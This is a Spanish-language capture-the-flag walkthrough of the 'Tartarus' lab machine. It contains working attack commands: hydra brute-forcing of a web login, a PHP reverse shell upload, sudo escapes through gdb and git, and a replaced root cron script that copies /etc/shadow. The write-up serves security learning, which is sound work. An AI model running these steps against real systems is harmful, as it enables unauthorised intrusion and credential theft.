# Tartarus
## Initial Scan
```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.95.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

## Enum
### FTP
El login anonymous esta permitido, conectemosno y veamos 
```
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ...
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
```
Accedemos la directorio ... y vemos un file llamado yougotgoodeyes.txt

Lo leemos y su contenido es:

```
/sUp3r-s3cr3t
```
Parece un directorio de la pagina web lo tendremos en cuenta a la hora de enumerar el HTTP

### HTTP

Mirando en robots.txt encontramos lo siguiente
```
User-Agent: *
Disallow : /admin-dir

I told d4rckh we should hide our things deep.
```
Un directorio y lo que podria ser un user ''d4rckh''

Si accedemos al directorio en cuestion tenemos una lista de usuarios y una de contraseñas, podemos usarlas para el SSH tal vez

Parece que en el directorio que encontramos antes gracias al FTP tenemos un login, sería otro buen sitio para probar con hydra, parece que al logearnos nos dice si la contraseña o el usuario son incorrectas, que amable sujeto el desarrollador

Pillamos los users validos
```
hydra -L user.txt -P credentials.txt 10.10.193.188 http-post-form '/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect username!'
```
Enox es un user valido, busquemos ahora su pass

```
 hydra -l enox -P credentials.txt 10.10.193.188 http-post-form '/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect password!'
 > [80][http-post-form] host: 10.10.193.188   login: enox   password: P@ssword1234
```
Vamo a logearno

### Exploit

Con las credenciales validas para enox nos logeamos y tenemos una opción para subir archivos, parece que no filtra extensiones pero no nos dice donde se almacena vamos a tirar de gobuster
```
/images (Status: 301)
```
Subimos la php reverse shell de Pentest Monkey y estamos dentro

## Privesc

```
User www-data may run the following commands on ubuntu-xenial:
    (thirtytwo) NOPASSWD: /var/www/gdb
```
Saltemos a thirtytwo mediante el siguiente comando
```
sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
```
Una vez dentro de thirtytwo vemos lo siguiente
```
User thirtytwo may run the following commands on ubuntu-xenial:
    (d4rckh) NOPASSWD: /usr/bin/git
```
Saltemos a d4rchkh
```
sudo -u d4rckh /usr/bin/git branch --help config
!/bin/sh
```
Ya somos d4rchkh veamos que tenemos a nuestra dispocision

```
-rwxrwxrwx 1 root   root    129 Jul  5 21:45 cleanup.py
```
Ese archivo es sospechoso
```
*/2 *   * * *   root    python /home/d4rckh/cleanup.py
```
Y vemos que se ejecuta en el crontab, vamos a sustituir el script por este
``` 
# -*- coding: utf-8 -*-
#!/usr/bin/env python
import os
import sys
try:
	os.system('cp /etc/shadow /home/d4rckh/shadow ; chmod 777 /home/d4rckh/shadow')
except:
  pass
```
Vemos que funciona, podemos o bien tratar de invocar una reverse shell o crackear el shadow.

Mediante la reverse shell accedemos facilmente como root y ya tenemos la máquina
